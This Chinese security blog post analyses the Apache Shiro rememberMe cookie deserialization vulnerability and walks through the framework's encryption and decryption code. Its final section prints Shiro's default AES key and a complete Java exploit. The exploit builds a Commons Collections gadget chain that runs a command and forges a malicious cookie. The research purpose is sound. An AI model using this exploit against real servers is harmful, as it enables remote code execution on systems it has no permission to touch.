---
title: Shiro反序列化分析
tags:
  - Java
  - 反序列化
  - Shiro
categories: 
  - Java
  - Shiro
  - 反序列化
description: Shrio反序列分析
excerpt: Shiro反序列化分析
typora-root-url: Shiro反序列化分析
abbrlink: 34062
date: 2022-03-22 21:21:55
---

## Shiro反序列化分析

### 原理

Apache Shiro是一个身份验证、授权、密码、会话管理的组件。该框架使用的CookieRememberMeManager处理的Cookie流程为：

Cookie => Base64_Decode => AES_Decrypt => Unserialize

如果将Cookie进行恶意构造，控制反序列的流程，就可以执行任意代码。

### 加密流程分析

先再AbstractRememberMeManager的encrypt方法下断点，然后开始登录，开始调试。

注意，这里只有勾选了rememberMe才会进入到rememberIdentity的逻辑从而调用encrypt方法，因此登录需要勾选该选项。

整体的一个调用栈大致如下：

```java
encrypt:470, AbstractRememberMeManager (org.apache.shiro.mgt)
convertPrincipalsToBytes:362, AbstractRememberMeManager (org.apache.shiro.mgt)
rememberIdentity:346, AbstractRememberMeManager (org.apache.shiro.mgt)
rememberIdentity:321, AbstractRememberMeManager (org.apache.shiro.mgt)
onSuccessfulLogin:297, AbstractRememberMeManager (org.apache.shiro.mgt)
rememberMeSuccessfulLogin:206, DefaultSecurityManager (org.apache.shiro.mgt)
onSuccessfulLogin:291, DefaultSecurityManager (org.apache.shiro.mgt)
login:285, DefaultSecurityManager (org.apache.shiro.mgt)
login:257, DelegatingSubject (org.apache.shiro.subject.support)
executeLogin:53, AuthenticatingFilter (org.apache.shiro.web.filter.authc)
...
```

encrypt方法如下：

```java
    protected byte[] encrypt(byte[] serialized) {
        byte[] value = serialized;
        CipherService cipherService = this.getCipherService();
        if (cipherService != null) {
            ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey());
            value = byteSource.getBytes();
        }

        return value;
    }
```

看一下传进来的`serialized`数据是什么：

```java
    protected byte[] convertPrincipalsToBytes(PrincipalCollection principals) {
        byte[] bytes = this.serialize(principals);
        if (this.getCipherService() != null) {
            bytes = this.encrypt(bytes);
        }

        return bytes;
    }
```

可以看到实际是PrincipalCollection的序列化数据，并且encrypt方法只有在CipherService存在才会被调用。

查一下CipherService是什么：

```java
private CipherService cipherService = new AesCipherService();
```

默认为AES的一个加密服务。

回到`encrypt`方法中，前两行应该就可以理解了，现在观察下面的：

```java
if (cipherService != null) {
    ByteSource byteSource = cipherService.encrypt(serialized, this.getEncryptionCipherKey());
    value = byteSource.getBytes();
}

return value;
```

可以发现调用了加密服务的加密方法对字节数组进行了加密，默认使用的是AES加密。

深入看一下AES的加密标准，即查看其cipherService：

![image-20220322220043074](./image-20220322220043074.png)

可以看到这是AES模式是CBC，填充方式为PKCS5Padding，密钥为128位。

由于加密后的字节流中含有不可见字符，因此Shiro会将其进行一次Base64 encode后防止到Cookie中。

看方法：

```java
protected void rememberIdentity(Subject subject, PrincipalCollection accountPrincipals) {
    byte[] bytes = this.convertPrincipalsToBytes(accountPrincipals);
    this.rememberSerializedIdentity(subject, bytes);
}
```

其中`convertPrincipalsToBytes`实际就是将PrincipalCollection对象序列化后进行一次AES加密，下面的`this.rememberSerializedIdentity`如下：

```java
protected void rememberSerializedIdentity(Subject subject, byte[] serialized) {
    if (!WebUtils.isHttp(subject)) {
        if (log.isDebugEnabled()) {
            String msg = "Subject argument is not an HTTP-aware instance.  This is required to obtain a servlet request and response in order to set the rememberMe cookie. Returning immediately and ignoring rememberMe operation.";
            log.debug(msg);
        }

    } else {
        HttpServletRequest request = WebUtils.getHttpRequest(subject);
        HttpServletResponse response = WebUtils.getHttpResponse(subject);
        String base64 = Base64.encodeToString(serialized);
        Cookie template = this.getCookie();
        Cookie cookie = new SimpleCookie(template);
        cookie.setValue(base64);
        cookie.saveTo(request, response);
    }
}
```

可以看到此处即将加密后的数据进行了一次Base64编码后设置到了cookie中，其中cookie的名为：

![image-20220322221124051](./image-20220322221124051.png)

至此整个过程就非常的显然了。

### 解密过程分析

参照加密过程，解密过程应该就是为其逆过程。

这里简单的跟进一下，先在`DefaultSecurityManagerresolvePrincipals`方法中下一个断点。

注意退出刷新页面(这样才会重写解析rememberMe)，注意Cookie要有rememberMe字段，然后就能断下来了。

方法如下：

```java
protected SubjectContext resolvePrincipals(SubjectContext context) {
    PrincipalCollection principals = context.resolvePrincipals();
    if (CollectionUtils.isEmpty(principals)) {
        log.trace("No identity (PrincipalCollection) found in the context.  Looking for a remembered identity.");
        principals = this.getRememberedIdentity(context);
        if (!CollectionUtils.isEmpty(principals)) {
            log.debug("Found remembered PrincipalCollection.  Adding to the context to be used for subject construction by the SubjectFactory.");
            context.setPrincipals(principals);
        } else {
            log.trace("No remembered identity found.  Returning original context.");
        }
    }
    return context;
}
```

可以看到根据`context`解析了`rememberMe`，跟进其中的`getRememberedIdentity`方法：

```java
protected PrincipalCollection getRememberedIdentity(SubjectContext subjectContext) {
    RememberMeManager rmm = this.getRememberMeManager();
    if (rmm != null) {
        try {
            return rmm.getRememberedPrincipals(subjectContext);
        } catch (Exception var5) {
            if (log.isWarnEnabled()) {
                String msg = "Delegate RememberMeManager instance of type [" + rmm.getClass().getName() + "] threw an exception during getRememberedPrincipals().";
            }
        }
    }
    return null;
}
```

实际上就是使用了`RememberMeManager`进行解析，再次跟进`RememberMeManager.getRememberedPrincipals`，

```java
    public PrincipalCollection getRememberedPrincipals(SubjectContext subjectContext) {
        PrincipalCollection principals = null;

        try {
            byte[] bytes = this.getRememberedSerializedIdentity(subjectContext);
            if (bytes != null && bytes.length > 0) {
                principals = this.convertBytesToPrincipals(bytes, subjectContext);
            }
        } catch (RuntimeException var4) {
            principals = this.onRememberedPrincipalFailure(var4, subjectContext);
        }

        return principals;
    }
```

跟进`getRememberedSerializedIdentity`方法：

```java
    protected byte[] getRememberedSerializedIdentity(SubjectContext subjectContext) {

        if (!WebUtils.isHttp(subjectContext)) {
            if (log.isDebugEnabled()) {
                String msg = "SubjectContext argument is not an HTTP-aware instance.  This is required to obtain a " +
                        "servlet request and response in order to retrieve the rememberMe cookie. Returning " +
                        "immediately and ignoring rememberMe operation.";
                log.debug(msg);
            }
            return null;
        }

        WebSubjectContext wsc = (WebSubjectContext) subjectContext;
        if (isIdentityRemoved(wsc)) {
            return null;
        }

        HttpServletRequest request = WebUtils.getHttpRequest(wsc);
        HttpServletResponse response = WebUtils.getHttpResponse(wsc);

        String base64 = getCookie().readValue(request, response);
        // Browsers do not always remove cookies immediately (SHIRO-183)
        // ignore cookies that are scheduled for removal
        if (Cookie.DELETED_COOKIE_VALUE.equals(base64)) return null;

        if (base64 != null) {
            base64 = ensurePadding(base64);
            if (log.isTraceEnabled()) {
                log.trace("Acquired Base64 encoded identity [" + base64 + "]");
            }
            byte[] decoded = Base64.decode(base64);
            if (log.isTraceEnabled()) {
                log.trace("Base64 decoded byte array length: " + (decoded != null ? decoded.length : 0) + " bytes.");
            }
            return decoded;
        } else {
            //no cookie set - new site visitor?
            return null;
        }
    }
```

非常简单的一个Base64解码，解码之后则是调用了`convertBytesToPrincipals`，跟进该方法：

```java
    protected PrincipalCollection convertBytesToPrincipals(byte[] bytes, SubjectContext subjectContext) {
        if (this.getCipherService() != null) {
            bytes = this.decrypt(bytes);
        }

        return this.deserialize(bytes);
    }
```

这里调用了`decrypt`方法，然后就是一个AES的解密，然后进行了一次反序列化。

### Shiro反序列化利用

在上面的过程中，我们分析了整一套Cookie处理流程，但是现在有一个问题就是Shiro在处理 Cookie时，使用了AES加密，而AES加密是需要密钥的，如果我们能拿到密钥的话，这就可以很轻松地让服务器反序列我们的数据。

在`AbstractRememberMeManager`类中：

```java
private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode("kPH+bIxk5D2deZiIxcaaaA==");
```

这里给出了默认的AES密钥，于是参考CC链，我们可以构造如下EXP：

```java
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.*;
import org.apache.commons.collections.map.LazyMap;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

import org.apache.shiro.codec.Base64;
import org.apache.shiro.crypto.AesCipherService;
import org.apache.shiro.crypto.CipherService;
import org.apache.shiro.io.DefaultSerializer;
import org.apache.shiro.io.Serializer;
import org.apache.shiro.subject.PrincipalCollection;
import org.apache.shiro.util.ByteSource;

public class Main {
    public static void main(String[] args) throws Exception{
        ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[] {
                        String.class, Class[].class }, new Object[] {
                        "getRuntime", new Class[0] }),
                new InvokerTransformer("invoke", new Class[] {
                        Object.class, Object[].class }, new Object[] {
                        null, new Object[0] }),
                new InvokerTransformer("exec",
                        new Class[] { String.class }, new Object[]{"notepad"})});
//        chain.transform(0);
        HashMap inMap = new HashMap();
        Class LZMClass = Class.forName("org.apache.commons.collections.map.LazyMap");
        Constructor lzm_constructor = LZMClass.getDeclaredConstructors()[0];
        lzm_constructor.setAccessible(true);
        LazyMap map = (LazyMap) lzm_constructor.newInstance(inMap, chain);

        Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);

        Map map_proxy = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[] {Map.class}, map_handler);
        InvocationHandler handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map_proxy);

        Serializer serializer = new DefaultSerializer();

        byte[] data = serializer.serialize(handler);
        CipherService aes = new AesCipherService();
        ByteSource bs = aes.encrypt(data, Base64.decode("kPH+bIxk5D2deZiIxcaaaA=="));
        byte[] en = bs.getBytes();
        System.out.println(Base64.encodeToString(en));
    }
}
```

但是比较尴尬的是，好像失败了。

查一下控制台可以发现：

```java
org.apache.shiro.io.SerializationException: Unable to deserialze argument byte array.
```

然后参考大佬的博客，是因为：

> Shiro resovleClass使用的是ClassLoader.loadClass()而非Class.forName()，而ClassLoader.loadClass不支持装载数组类型的class。

如果添加了CC4版本的话，那么就可以直接打下了，具体的EXP参考上面就可以写出，此处不赘述。

如果目标确实没有高版本的依赖，那么可以考虑使用JRMP进行利用。

JRMP会在下一博客说明。
